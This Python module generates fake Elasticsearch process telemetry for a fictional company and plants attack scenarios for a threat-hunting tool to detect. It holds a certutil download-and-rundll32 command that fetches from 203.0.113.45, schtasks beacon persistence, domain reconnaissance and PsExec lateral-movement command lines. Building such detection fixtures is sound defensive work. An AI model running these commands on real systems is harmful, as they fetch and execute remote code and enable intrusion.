"""
mock_responses.py — a fake Elasticsearch holding 21 days of process telemetry
for a 26-person company (6 departments, one workstation each) plus the
machine activity that runs underneath them.

Every document is an ECS process-start event (Sysmon 1 / Security 4688 shape).
Planted stories — one per exhibit, and they connect:

  💓 Heartbeat   legit machine rhythms (GoogleUpdate, EdgeUpdate, Defender,
                 CompatTelRunner) + a jittery 5-minute beacon on sara.kim's
                 machine + a harmless dev polling script on li.wang's box.
  🦠 Outbreaks   an update wave via the Windows Update service (managed), an
                 app adopted user by user over two weeks (organic), a fake
                 invoice viewer from Outlook hitting 7 hosts in ~80 min
                 (phishing-like), and the next day a service binary hopping
                 host to host, accelerating (worm-like).
  📖 Grammar     hana.ito: outlook → invoice viewer → cmd → certutil → rundll32.
  🗺️ Org chart   liam.chen sits in Finance but works like Engineering;
                 one evening session on nora.diaz's account works like IT admin
                 omar.haddad.
  🌅 Novelty     the update wave (explained) and the phishing/worm days (not).
  ⚛️ Physics     wscript.exe launches updsvc.exe from C:\\Users\\Public and dies
                 in 0.4 s; updsvc.exe is still running days later. Legit
                 look-alikes: an installer that hands off and exits, OneDrive
                 running for weeks, a dev's ngrok tunnel.

Point the app at a real cluster (FTD_MODE=elastic) and this file is unused.
"""
from __future__ import annotations

import bisect
import hashlib
import zlib
import math
import random
from datetime import datetime, timedelta, timezone

UTC = timezone.utc
DAYS = 21
INDEX_NAME = ".ds-logs-windows.sysmon_operational-default-2026.10.11-000001"

DEPTS = {
    "FIN": ["hana.ito", "liam.chen", "maria.silva", "tom.becker", "ava.patel"],
    "SAL": ["bob.martin", "sara.kim", "diego.ruiz", "emma.wolf", "raj.mehta"],
    "HR": ["nora.diaz", "carol.diaz", "ines.park", "yuki.sato"],
    "DEV": ["dave.kim", "li.wang", "sam.taylor", "priya.nair", "max.mueller"],
    "IT": ["omar.haddad", "erin.patel", "felix.braun"],
    "MKT": ["zoe.adams", "leo.costa", "mia.novak", "kai.jensen"],
}
HOST_OF = {}
DEPT_OF = {}
for _d, _us in DEPTS.items():
    for _i, _u in enumerate(_us, 1):
        HOST_OF[_u] = f"WS-{_d}-{_i:03d}"
        DEPT_OF[_u] = _d

MW, MC = "Microsoft Windows", "Microsoft Corporation"
OFF = r"C:\Program Files\Microsoft Office\root\Office16"
APPS = {
    "explorer.exe": (r"C:\Windows\explorer.exe", MW),
    "outlook.exe": (OFF + r"\OUTLOOK.EXE", MC),
    "winword.exe": (OFF + r"\WINWORD.EXE", MC),
    "excel.exe": (OFF + r"\EXCEL.EXE", MC),
    "powerpnt.exe": (OFF + r"\POWERPNT.EXE", MC),
    "onenote.exe": (OFF + r"\ONENOTE.EXE", MC),
    "ms-teams.exe": (r"C:\Program Files\WindowsApps\MSTeams_24215.1007.3082.1590_x64__8wekyb3d8bbwe\ms-teams.exe", MC),
    "chrome.exe": (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "Google LLC"),
    "msedge.exe": (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", MC),
    "notepad.exe": (r"C:\Windows\System32\notepad.exe", MW),
    "calc.exe": (r"C:\Windows\System32\calc.exe", MW),
    "snippingtool.exe": (r"C:\Windows\System32\SnippingTool.exe", MW),
    "acrobat.exe": (r"C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe", "Adobe Inc."),
    "zoom.exe": (r"C:\Users\{u}\AppData\Roaming\Zoom\bin\Zoom.exe", "Zoom Video Communications, Inc."),
    "saplogon.exe": (r"C:\Program Files (x86)\SAP\FrontEnd\SAPgui\saplogon.exe", "SAP SE"),
    "pbidesktop.exe": (r"C:\Program Files\Microsoft Power BI Desktop\bin\PBIDesktop.exe", MC),
    "code.exe": (r"C:\Users\{u}\AppData\Local\Programs\Microsoft VS Code\Code.exe", MC),
    "git.exe": (r"C:\Program Files\Git\cmd\git.exe", "Johannes Schindelin"),
    "node.exe": (r"C:\Program Files\nodejs\node.exe", "OpenJS Foundation"),
    "python.exe": (r"C:\Users\{u}\AppData\Local\Programs\Python\Python312\python.exe", "Python Software Foundation"),
    "windowsterminal.exe": (r"C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.21.2361.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe", MC),
    "powershell.exe": (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", MW),
    "cmd.exe": (r"C:\Windows\System32\cmd.exe", MW),
    "docker.exe": (r"C:\Program Files\Docker\Docker\resources\bin\docker.exe", "Docker Inc"),
    "devenv.exe": (r"C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\IDE\devenv.exe", MC),
    "mmc.exe": (r"C:\Windows\System32\mmc.exe", MW),
    "mstsc.exe": (r"C:\Windows\System32\mstsc.exe", MW),
    "putty.exe": (r"C:\Program Files\PuTTY\putty.exe", "Simon Tatham"),
    "servermanager.exe": (r"C:\Windows\System32\ServerManager.exe", MW),
    "ping.exe": (r"C:\Windows\System32\PING.EXE", MW),
    "nltest.exe": (r"C:\Windows\System32\nltest.exe", MW),
    "net.exe": (r"C:\Windows\System32\net.exe", MW),
    "whoami.exe": (r"C:\Windows\System32\whoami.exe", MW),
    "psexec64.exe": (r"C:\Tools\Sysinternals\PsExec64.exe", "Microsoft Corporation"),
    "photoshop.exe": (r"C:\Program Files\Adobe\Adobe Photoshop 2026\Photoshop.exe", "Adobe Inc."),
    "illustrator.exe": (r"C:\Program Files\Adobe\Adobe Illustrator 2026\Support Files\Contents\Windows\Illustrator.exe", "Adobe Inc."),
    "figma.exe": (r"C:\Users\{u}\AppData\Local\Figma\Figma.exe", "Figma, Inc."),
    "certutil.exe": (r"C:\Windows\System32\certutil.exe", MW),
    "rundll32.exe": (r"C:\Windows\System32\rundll32.exe", MW),
    "schtasks.exe": (r"C:\Windows\System32\schtasks.exe", MW),
    "wscript.exe": (r"C:\Windows\System32\wscript.exe", MW),
    "onedrive.exe": (r"C:\Program Files\Microsoft OneDrive\OneDrive.exe", MC),
    "googleupdate.exe": (r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe", "Google LLC"),
    "microsoftedgeupdate.exe": (r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe", MC),
    "mpcmdrun.exe": (r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MpCmdRun.exe", MC),
    "compattelrunner.exe": (r"C:\Windows\System32\CompatTelRunner.exe", MW),
    "tiworker.exe": (r"C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.2307_none\TiWorker.exe", MW),
    "mousocoreworker.exe": (r"C:\Windows\System32\MoUsoCoreWorker.exe", MW),
}

# Markov "grammar" of each department: state -> {next app: weight}
_OFFICE_START = {"outlook.exe": 6, "ms-teams.exe": 3, "chrome.exe": 3}
TRANS = {
    "FIN": {
        "<s>": {"outlook.exe": 6, "excel.exe": 3, "saplogon.exe": 2, "ms-teams.exe": 2},
        "outlook.exe": {"excel.exe": 6, "acrobat.exe": 2, "ms-teams.exe": 2, "saplogon.exe": 2, "winword.exe": 1},
        "excel.exe": {"saplogon.exe": 3, "outlook.exe": 3, "pbidesktop.exe": 2, "excel.exe": 2, "ms-teams.exe": 1},
        "saplogon.exe": {"excel.exe": 6, "outlook.exe": 1},
        "pbidesktop.exe": {"excel.exe": 2, "ms-teams.exe": 1, "outlook.exe": 1},
        "acrobat.exe": {"excel.exe": 2, "outlook.exe": 2},
        "ms-teams.exe": {"excel.exe": 2, "outlook.exe": 2, "chrome.exe": 1},
        "chrome.exe": {"excel.exe": 1, "outlook.exe": 1},
        "winword.exe": {"outlook.exe": 2, "acrobat.exe": 1},
    },
    "SAL": {
        "<s>": {"outlook.exe": 5, "chrome.exe": 4, "ms-teams.exe": 2},
        "outlook.exe": {"chrome.exe": 5, "zoom.exe": 3, "powerpnt.exe": 2, "ms-teams.exe": 2, "excel.exe": 1},
        "chrome.exe": {"outlook.exe": 3, "zoom.exe": 2, "powerpnt.exe": 1, "excel.exe": 1},
        "zoom.exe": {"chrome.exe": 3, "outlook.exe": 2, "powerpnt.exe": 1},
        "powerpnt.exe": {"zoom.exe": 2, "outlook.exe": 2, "chrome.exe": 1},
        "ms-teams.exe": {"chrome.exe": 2, "outlook.exe": 2, "zoom.exe": 1},
        "excel.exe": {"outlook.exe": 2, "chrome.exe": 1},
    },
    "HR": {
        "<s>": {"outlook.exe": 6, "chrome.exe": 3, "ms-teams.exe": 2},
        "outlook.exe": {"winword.exe": 5, "acrobat.exe": 4, "chrome.exe": 3, "ms-teams.exe": 2},
        "winword.exe": {"acrobat.exe": 3, "outlook.exe": 3, "chrome.exe": 1},
        "acrobat.exe": {"outlook.exe": 3, "winword.exe": 2, "chrome.exe": 1},
        "chrome.exe": {"outlook.exe": 3, "winword.exe": 1, "excel.exe": 1},
        "ms-teams.exe": {"outlook.exe": 2, "chrome.exe": 2},
        "excel.exe": {"outlook.exe": 2, "winword.exe": 1},
    },
    "MKT": {
        "<s>": {"chrome.exe": 4, "outlook.exe": 3, "figma.exe": 3, "ms-teams.exe": 2},
        "chrome.exe": {"figma.exe": 4, "photoshop.exe": 3, "outlook.exe": 2, "illustrator.exe": 1},
        "figma.exe": {"chrome.exe": 3, "photoshop.exe": 2, "ms-teams.exe": 2},
        "photoshop.exe": {"illustrator.exe": 3, "figma.exe": 2, "chrome.exe": 2},
        "illustrator.exe": {"photoshop.exe": 2, "figma.exe": 1, "outlook.exe": 1},
        "outlook.exe": {"chrome.exe": 3, "figma.exe": 1, "powerpnt.exe": 1},
        "ms-teams.exe": {"figma.exe": 2, "chrome.exe": 1},
        "powerpnt.exe": {"outlook.exe": 1, "photoshop.exe": 1},
    },
    "DEV": {
        "<s>": {"windowsterminal.exe": 4, "code.exe": 4, "ms-teams.exe": 2, "chrome.exe": 2, "outlook.exe": 1},
        "windowsterminal.exe": {"powershell.exe": 8, "cmd.exe": 1},
        "powershell.exe": {"git.exe": 5, "node.exe": 3, "python.exe": 3, "docker.exe": 2, "code.exe": 2},
        "code.exe": {"git.exe": 4, "node.exe": 3, "chrome.exe": 2, "windowsterminal.exe": 2},
        "git.exe": {"code.exe": 3, "node.exe": 2, "git.exe": 2, "chrome.exe": 1},
        "node.exe": {"chrome.exe": 3, "code.exe": 2, "git.exe": 1},
        "python.exe": {"code.exe": 2, "chrome.exe": 1, "git.exe": 1},
        "docker.exe": {"code.exe": 1, "chrome.exe": 1},
        "chrome.exe": {"code.exe": 3, "ms-teams.exe": 1, "windowsterminal.exe": 2},
        "ms-teams.exe": {"code.exe": 2, "chrome.exe": 1},
        "outlook.exe": {"ms-teams.exe": 1, "code.exe": 1},
        "cmd.exe": {"git.exe": 1, "code.exe": 1},
    },
    "IT": {
        "<s>": {"outlook.exe": 3, "windowsterminal.exe": 4, "mmc.exe": 3, "ms-teams.exe": 2},
        "outlook.exe": {"mmc.exe": 3, "mstsc.exe": 3, "windowsterminal.exe": 2, "ms-teams.exe": 1},
        "windowsterminal.exe": {"powershell.exe": 8},
        "powershell.exe": {"ping.exe": 2, "nltest.exe": 2, "net.exe": 2, "mstsc.exe": 2, "whoami.exe": 1, "psexec64.exe": 1},
        "mmc.exe": {"mstsc.exe": 3, "powershell.exe": 2, "outlook.exe": 1},
        "mstsc.exe": {"mmc.exe": 2, "putty.exe": 2, "outlook.exe": 2, "servermanager.exe": 1},
        "putty.exe": {"mstsc.exe": 2, "outlook.exe": 1},
        "servermanager.exe": {"mmc.exe": 2},
        "ms-teams.exe": {"outlook.exe": 1, "mmc.exe": 1},
        "ping.exe": {"powershell.exe": 2, "mstsc.exe": 1}, "nltest.exe": {"net.exe": 2, "mmc.exe": 1},
        "net.exe": {"mmc.exe": 1, "powershell.exe": 1}, "whoami.exe": {"mmc.exe": 1},
        "psexec64.exe": {"mmc.exe": 1, "mstsc.exe": 1},
    },
}
# Child-launch relationships: when B follows A, A is B's parent (otherwise explorer).
CHILD_OF = {
    ("outlook.exe", "winword.exe"), ("outlook.exe", "excel.exe"), ("outlook.exe", "acrobat.exe"),
    ("outlook.exe", "chrome.exe"), ("outlook.exe", "zoom.exe"), ("ms-teams.exe", "chrome.exe"),
    ("windowsterminal.exe", "powershell.exe"), ("windowsterminal.exe", "cmd.exe"),
    ("powershell.exe", "git.exe"), ("powershell.exe", "python.exe"), ("powershell.exe", "node.exe"),
    ("powershell.exe", "docker.exe"), ("powershell.exe", "ping.exe"), ("powershell.exe", "nltest.exe"),
    ("powershell.exe", "net.exe"), ("powershell.exe", "whoami.exe"), ("powershell.exe", "psexec64.exe"),
    ("code.exe", "git.exe"), ("code.exe", "node.exe"), ("code.exe", "python.exe"), ("cmd.exe", "git.exe"),
}
SHORT = {"git.exe", "ping.exe", "nltest.exe", "net.exe", "whoami.exe", "psexec64.exe", "docker.exe",
         "certutil.exe", "cmd.exe", "schtasks.exe", "calc.exe", "snippingtool.exe"}
QUIRKS = ["onenote.exe", "calc.exe", "snippingtool.exe", "notepad.exe", "msedge.exe"]
DOCS = ["Q3 Board Summary", "Offsite Agenda", "Vendor Contract v4", "Onboarding Checklist", "Policy Draft",
        "Pipeline Review", "Forecast FY27", "Brand Guidelines", "Campaign Brief", "Expense Report"]


def _h(x) -> int:
    """Deterministic hash (Python's hash() is randomized per process)."""
    return zlib.crc32(repr(x).encode())


def iso(dt):
    return dt.astimezone(UTC).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def ms(dt):
    return int(dt.timestamp() * 1000)


def parse(ts):
    return datetime.fromisoformat(ts.replace("Z", "+00:00"))


def _sha(exe: str, version: str = "1") -> str:
    """A file hash depends on the file's content, not where it sits — so hash the
    binary's name + version, not its full (per-user) path."""
    base = exe.replace("/", "\\").rsplit("\\", 1)[-1].lower()
    return hashlib.sha256(f"{base}|{version}".encode()).hexdigest()


class _Gen:
    def __init__(self, now: datetime, seed: int = 1):
        self.now = now
        self.rng = random.Random(seed)
        self.docs: list[dict] = []

    def guid(self):
        h = f"{self.rng.getrandbits(128):032x}"
        return "{" + f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}" + "}"

    def virtual(self, name, exe):
        return {"entity_id": self.guid(), "pid": self.rng.randrange(400, 9000, 4), "name": name, "executable": exe,
                "end": None}

    def spawn(self, parent, name, start, user, host, tail="", *, exe=None, signer=..., version="1", cmd=None,
              seconds=None, cap=None, running=False, cwd=None):
        if parent is None or start > self.now:
            return None
        dexe, dsign = APPS.get(name, (None, None))
        exe = (exe or dexe).format(u=user)
        signer = dsign if signer is ... else signer
        cmd = cmd or (f'"{exe}" {tail}'.strip())
        if seconds is None:
            seconds = self.rng.uniform(2, 40) if name in SHORT else self.rng.uniform(300, 7200)
        end = start + timedelta(seconds=seconds)
        if cap is not None and end > cap:
            end = cap
        proc = {
            "entity_id": self.guid(), "pid": self.rng.randrange(1000, 60000, 4), "name": name, "executable": exe,
            "command_line": cmd, "start": iso(start), "working_directory": cwd or rf"C:\Users\{user}",
            "hash": {"sha256": _sha(exe, version)},
            "code_signature": {"exists": signer is not None, "trusted": signer is not None},
            "parent": {k: parent[k] for k in ("entity_id", "pid", "name", "executable")},
        }
        if signer:
            proc["code_signature"]["subject_name"] = signer
        if not running and end <= self.now:
            proc["end"] = iso(end)
            proc["exit_code"] = 0
        self.docs.append({
            "@timestamp": iso(start),
            "event": {"category": ["process"], "type": ["start"], "kind": "event", "code": "1",
                      "provider": "Microsoft-Windows-Sysmon", "dataset": "windows.sysmon_operational"},
            "host": {"name": host, "hostname": host, "os": {"family": "windows", "name": "Windows 11 Enterprise"}},
            "user": {"name": user, "domain": "CONTOSO" if user != "SYSTEM" else "NT AUTHORITY"},
            "process": proc,
        })
        proc["_end_dt"] = None if (running or end > self.now) else end
        return proc


# ───────────────────────── people ─────────────────────────
class Person:
    def __init__(self, user, rng):
        self.user, self.host, self.dept = user, HOST_OF[user], DEPT_OF[user]
        self.style = "DEV" if user == "liam.chen" else self.dept      # the misfit
        r = random.Random(_h(user))
        self.start_hour = r.gauss(9.6 if self.style == "DEV" else 8.4, 0.5)
        if user == "max.mueller":
            self.start_hour = 11.5                                      # night owl
        base = TRANS[self.style]
        self.trans = {s: {k: w * math.exp(r.gauss(0, 0.55)) for k, w in nxt.items()} for s, nxt in base.items()}
        for q in r.sample(QUIRKS, 2):                                   # personal habits
            self.trans.setdefault("<s>", {})[q] = r.uniform(0.6, 1.6)
            for s in r.sample(list(self.trans), 2):
                self.trans[s][q] = r.uniform(0.3, 1.0)
            self.trans.setdefault(q, {k: 1 for k in list(base["<s>"])[:3]})

    def walk(self, rng, n):
        out, state = [], "<s>"
        for _ in range(n):
            nxt = self.trans.get(state) or self.trans["<s>"]
            keys = list(nxt)
            state = rng.choices(keys, weights=[nxt[k] for k in keys])[0]
            out.append(state)
        return out


def _tail(name, rng, user):
    if name in ("winword.exe", "acrobat.exe"):
        return f'"C:\\Users\\{user}\\Documents\\{rng.choice(DOCS)}.{"docx" if name == "winword.exe" else "pdf"}"'
    if name == "excel.exe":
        return f'"C:\\Users\\{user}\\Documents\\{rng.choice(DOCS)}.xlsx"'
    if name == "git.exe":
        return rng.choice(["status", "pull --rebase", "fetch --prune", "log --oneline -n 20", "diff --stat"])
    if name == "node.exe":
        return rng.choice([r"node_modules\.bin\vite build", r"scripts\gen-api.js", r"node_modules\jest\bin\jest.js"])
    if name == "python.exe":
        return rng.choice(["-m pytest tests -q", r"scripts\etl.py --since 7d", "-m pip list --outdated"])
    if name == "ping.exe":
        return f"-n 4 srv-{rng.randint(1, 40):02d}.contoso.local"
    if name == "mmc.exe":
        return r'"C:\Windows\system32\dsa.msc"'
    if name == "mstsc.exe":
        return f"/v:srv-{rng.randint(1, 40):02d}.contoso.local"
    if name == "nltest.exe":
        return "/dsgetdc:contoso.local"
    if name == "net.exe":
        return rng.choice(["user /domain", "group \"Helpdesk\" /domain", "use"])
    if name == "chrome.exe":
        return "--profile-directory=Default"
    return ""


def human_day(g: _Gen, p: Person, day: datetime, short=False):
    rng = g.rng
    start = day + timedelta(hours=p.start_hour + rng.gauss(0, 0.3))
    length = rng.uniform(2.5, 4) if short else rng.uniform(7.5, 9.5)
    end = start + timedelta(hours=length)
    ui = g.virtual("userinit.exe", r"C:\Windows\System32\userinit.exe")
    exp = g.spawn(ui, "explorer.exe", start, p.user, p.host, cmd=r"C:\Windows\Explorer.EXE",
                  seconds=(end - start).total_seconds())
    if exp is None:
        return None
    ctx = {"explorer": exp, "procs": {}, "end": end}
    t = start + timedelta(minutes=rng.uniform(1, 4))
    while t < end - timedelta(minutes=15):
        seq = p.walk(rng, rng.randint(4, 11))
        prev = None
        for name in seq:
            if t >= end:
                break
            par = ctx["procs"].get(prev) if (prev, name) in CHILD_OF else exp
            par = par or exp
            pr = g.spawn(par, name, t, p.user, p.host, _tail(name, rng, p.user), cap=end)
            if pr is None:
                return ctx
            ctx["procs"][name] = pr
            if name in ("chrome.exe", "msedge.exe"):
                for i in range(rng.randint(2, 7)):
                    g.spawn(pr, name, t + timedelta(seconds=rng.uniform(0.3, 40)), p.user, p.host,
                            f"--type=renderer --renderer-client-id={rng.randint(5, 900)} --lang=en-US",
                            exe=pr["executable"], seconds=rng.uniform(20, 1800), cap=end)
            prev = name
            t += timedelta(minutes=rng.expovariate(1 / 5.5) + 0.2)
        t += timedelta(minutes=rng.uniform(15, 70))
    return ctx


# ───────────────────────── machines ─────────────────────────
def machine_day(g: _Gen, host: str, day: datetime, wave_day: datetime | None):
    rng = random.Random(_h((host, day.date().isoformat())))
    svc = g.virtual("svchost.exe", r"C:\Windows\System32\svchost.exe")
    mp = g.virtual("msmpeng.exe", r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe")
    off = _h(host) % 3600
    for h in range(24):
        base = day + timedelta(hours=h, seconds=off)
        g.spawn(svc, "googleupdate.exe", base + timedelta(seconds=rng.uniform(-2, 2)), "SYSTEM", host,
                "/ua /installsource scheduler", seconds=rng.uniform(15, 40))
        g.spawn(svc, "microsoftedgeupdate.exe", base + timedelta(minutes=17, seconds=rng.uniform(-2, 2)), "SYSTEM",
                host, "/ua /installsource scheduler", seconds=rng.uniform(10, 30))
    ver = "2" if (wave_day is not None and day >= wave_day) else "1"
    for h in range(0, 24, 4):
        g.spawn(mp, "mpcmdrun.exe", day + timedelta(hours=h, minutes=41, seconds=rng.uniform(-30, 30)), "SYSTEM",
                host, "-SignaturesUpdate -ScheduleJob -RestrictPrivileges", version=ver, seconds=rng.uniform(20, 90))
    g.spawn(svc, "compattelrunner.exe", day + timedelta(hours=3, minutes=12, seconds=rng.uniform(-60, 60)),
            "SYSTEM", host, "-m:appraiser.dll -f:DoScheduledTelemetryRun", seconds=rng.uniform(60, 300))
    if wave_day is not None and day.date() == wave_day.date():
        t = day + timedelta(hours=rng.uniform(1, 11))
        tw = g.spawn(svc, "tiworker.exe", t, "SYSTEM", host, "-Embedding", version="10.0.26100.2307", seconds=1800)
        g.spawn(svc, "mousocoreworker.exe", t + timedelta(minutes=3), "SYSTEM", host, "-Embedding",
                version="10.0.26100.2307", seconds=300)
        for k, (nm, path, tail) in enumerate([
                ("mrt.exe", r"C:\Windows\System32\MRT.exe", "/EHB /Q"),
                ("dismhost.exe", r"C:\Windows\Temp\{{7F3C2A11-5B6E-4D2A-9C1E-0A6B3D9E2F10}}\DismHost.exe", "{7F3C2A11-5B6E-4D2A-9C1E-0A6B3D9E2F10}"),
                ("sihclient.exe", r"C:\Windows\System32\SIHClient.exe", "/cv 8b1fA9"),
                ("musnotification.exe", r"C:\Windows\System32\MusNotification.exe", "ReadyToReboot"),
                ("mpsigstub.exe", r"C:\Windows\SoftwareDistribution\Download\Install\MpSigStub.exe", "/stub 1.1.24090.11"),
                ("wuauclt.exe", r"C:\Windows\System32\wuauclt.exe", "/UpdateDeploymentProvider UpdateDeploymentProvider.dll")]):
            if tw is not None:
                g.spawn(tw, nm, t + timedelta(minutes=5 + 2 * k), "SYSTEM", host, tail, exe=path, signer=MC,
                        version="2026.10", seconds=g.rng.uniform(20, 200))


# ───────────────────────── planted stories ─────────────────────────
def _weekday_back(today: datetime, k: int) -> datetime:
    d = today - timedelta(days=k)
    while d.weekday() >= 5:
        d -= timedelta(days=1)
    return d


def generate(now: datetime) -> list[dict]:
    g = _Gen(now, seed=7)
    today = now.replace(hour=0, minute=0, second=0, microsecond=0)
    start_day = today - timedelta(days=DAYS - 1)
    people = {u: Person(u, g.rng) for u in HOST_OF}

    wave = _weekday_back(today, 12)
    while wave.weekday() != 1:                       # a Tuesday
        wave -= timedelta(days=1)
    phish = _weekday_back(today, 5)
    worm = phish + timedelta(days=1)
    while worm.weekday() >= 5:
        worm += timedelta(days=1)
    if worm > today:
        worm = phish
    takeover = _weekday_back(today, 9)
    vanish = _weekday_back(today, 6)

    ctxs: dict = {}
    for i in range(DAYS):
        day = start_day + timedelta(days=i)
        for host in sorted(set(HOST_OF.values())):
            machine_day(g, host, day, wave)
        for u, p in people.items():
            weekend = day.weekday() >= 5
            if weekend and g.rng.random() > 0.12:
                continue
            ctx = human_day(g, p, day, short=weekend)
            ctxs[(u, day.date())] = ctx
            if i == 0 and ctx and g.rng.random() < 0.4:   # OneDrive started once and never stops
                g.spawn(ctx["explorer"], "onedrive.exe", day + timedelta(hours=p.start_hour, minutes=1), u,
                        p.host, "/background", running=True)

    def ctx_for(u, day):
        c = ctxs.get((u, day.date()))
        if c is None:
            c = human_day(g, people[u], day)
            ctxs[(u, day.date())] = c
        return c

    def outlook_of(c, u, t):
        o = c["procs"].get("outlook.exe")
        return o or g.spawn(c["explorer"], "outlook.exe", t - timedelta(minutes=5), u, HOST_OF[u], cap=c["end"])

    # 🦠 phishing-like: a fake invoice viewer opened from Outlook across 7 hosts in ~80 minutes
    t0 = phish + timedelta(hours=10, minutes=12)
    victims = [("hana.ito", 0), ("sara.kim", 9), ("bob.martin", 17), ("ines.park", 26), ("maria.silva", 41),
               ("zoe.adams", 55), ("raj.mehta", 78)]
    for u, dm in victims:
        t = t0 + timedelta(minutes=dm)
        c = ctx_for(u, phish)
        ol = outlook_of(c, u, t)
        exe = rf"C:\Users\{u}\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\K3T9QZ1M\Invoice_88231_viewer.exe"
        v = g.spawn(ol, "invoice_88231_viewer.exe", t, u, HOST_OF[u], exe=exe, signer=None, seconds=50,
                    cwd=rf"C:\Users\{u}\Downloads")
        if u == "hana.ito":   # 📖 the sentence that doesn't fit
            c1 = g.spawn(v, "cmd.exe", t + timedelta(seconds=6), u, HOST_OF[u],
                         cmd=r"cmd.exe /c certutil -urlcache -f http://203.0.113.45/u.dat C:\Users\Public\u.dll && rundll32 C:\Users\Public\u.dll,Start",
                         seconds=20)
            g.spawn(c1, "certutil.exe", t + timedelta(seconds=7), u, HOST_OF[u],
                    r"-urlcache -f http://203.0.113.45/u.dat C:\Users\Public\u.dll", seconds=4)
            g.spawn(c1, "rundll32.exe", t + timedelta(seconds=13), u, HOST_OF[u], r"C:\Users\Public\u.dll,Start",
                    seconds=120)
        if u == "sara.kim":   # 💓 persistence → a 5-minute beacon with jitter, 24/7
            g.spawn(v, "schtasks.exe", t + timedelta(seconds=8), u, HOST_OF[u],
                    r'/create /sc minute /mo 5 /tn "OneDrive Cache" /tr "rundll32 C:\Users\Public\Libraries\cache.dll,Start"',
                    seconds=2)
            th = g.virtual("taskhostw.exe", r"C:\Windows\System32\taskhostw.exe")
            bt = t + timedelta(minutes=5)
            while bt < now:
                g.spawn(th, "rundll32.exe", bt, u, HOST_OF[u], r"C:\Users\Public\Libraries\cache.dll,Start",
                        seconds=g.rng.uniform(1.5, 4))
                bt += timedelta(seconds=300 * g.rng.uniform(0.8, 1.2))

    # 🦠 worm-like: a service binary hopping host to host, accelerating
    hops = ["WS-FIN-001", "WS-FIN-003", "WS-SAL-002", "WS-IT-002", "WS-HR-003", "WS-DEV-004", "WS-MKT-001",
            "WS-SAL-005", "WS-HR-002"]
    gaps = [0, 38, 24, 15, 9, 6, 4, 3, 2]
    t = worm + timedelta(hours=14, minutes=5)
    for host, gm in zip(hops, gaps):
        t += timedelta(minutes=gm, seconds=g.rng.uniform(0, 40))
        sv = g.virtual("services.exe", r"C:\Windows\System32\services.exe")
        w = g.spawn(sv, "svcmon.exe", t, "SYSTEM", host, "-k netsvc", exe=r"C:\Windows\Temp\svcmon.exe", signer=None,
                    seconds=7200, cwd=r"C:\Windows\Temp")
        g.spawn(w, "cmd.exe", t + timedelta(seconds=30), "SYSTEM", host, cmd="cmd.exe /c net view /domain", seconds=6)

    # 🦠 organic: an app adopted person by person over two weeks
    adopters = ["kai.jensen", "zoe.adams", "mia.novak", "sam.taylor", "emma.wolf", "priya.nair", "ines.park",
                "diego.ruiz"]
    days = sorted(g.rng.sample(range(4, DAYS - 2), len(adopters)))
    for u, di in zip(adopters, days):
        day = _weekday_back(start_day + timedelta(days=di), 0)
        c = ctx_for(u, day)
        if c is None:
            continue
        tt = day + timedelta(hours=people[u].start_hour + g.rng.uniform(1, 6))
        s = g.spawn(c["explorer"], "notionsetup.exe", tt, u, HOST_OF[u],
                    exe=rf"C:\Users\{u}\Downloads\NotionSetup.exe", signer="Notion Labs, Inc.", seconds=2.5)
        g.spawn(s, "notion.exe", tt + timedelta(seconds=2), u, HOST_OF[u],
                exe=rf"C:\Users\{u}\AppData\Local\Programs\Notion\Notion.exe", signer="Notion Labs, Inc.",
                seconds=3 * 3600, cap=c["end"])

    # 🗺️ takeover: an evening session on nora.diaz's account that works like IT admin omar.haddad
    tt = takeover + timedelta(hours=19, minutes=38)
    ui = g.virtual("userinit.exe", r"C:\Windows\System32\userinit.exe")
    ex = g.spawn(ui, "explorer.exe", tt, "nora.diaz", HOST_OF["nora.diaz"], cmd=r"C:\Windows\Explorer.EXE",
                 seconds=3000)
    wt = g.spawn(ex, "windowsterminal.exe", tt + timedelta(minutes=1), "nora.diaz", HOST_OF["nora.diaz"], seconds=2700)
    ps = g.spawn(wt, "powershell.exe", tt + timedelta(minutes=1, seconds=3), "nora.diaz", HOST_OF["nora.diaz"],
                 seconds=2600)
    seq = [("whoami.exe", "/all"), ("net.exe", "group \"Domain Admins\" /domain"), ("nltest.exe", "/dclist:contoso.local"),
           ("net.exe", "user /domain"), ("psexec64.exe", r"\\WS-IT-002 -s cmd.exe"), ("ping.exe", "-n 1 srv-03")]
    k = tt + timedelta(minutes=2)
    for name, tail in seq:
        g.spawn(ps, name, k, "nora.diaz", HOST_OF["nora.diaz"], tail)
        k += timedelta(minutes=g.rng.uniform(1, 4))
    g.spawn(ex, "mmc.exe", k, "nora.diaz", HOST_OF["nora.diaz"], r'"C:\Windows\system32\dsa.msc"', seconds=900)
    g.spawn(ex, "mstsc.exe", k + timedelta(minutes=6), "nora.diaz", HOST_OF["nora.diaz"], "/v:srv-dc01.contoso.local",
            seconds=600)
    g.spawn(ex, "mmc.exe", k + timedelta(minutes=14), "nora.diaz", HOST_OF["nora.diaz"], r'"C:\Windows\system32\gpmc.msc"',
            seconds=600)

    # ⚛️ spawn-and-vanish: wscript dies in 0.4 s; its child keeps running for days
    c = ctx_for("leo.costa", vanish)
    tt = vanish + timedelta(hours=11, minutes=3)
    ws = g.spawn(c["explorer"], "wscript.exe", tt, "leo.costa", HOST_OF["leo.costa"],
                 r'"C:\Users\leo.costa\Downloads\font_pack.js"', seconds=0.4)
    g.spawn(ws, "updsvc.exe", tt + timedelta(seconds=0.2), "leo.costa", HOST_OF["leo.costa"], "-silent",
            exe=r"C:\Users\Public\updsvc.exe", signer=None, running=True, cwd=r"C:\Users\Public")

    # 💓 harmless automation: a dev polling CI every 2 minutes, office hours only
    for i in range(DAYS):
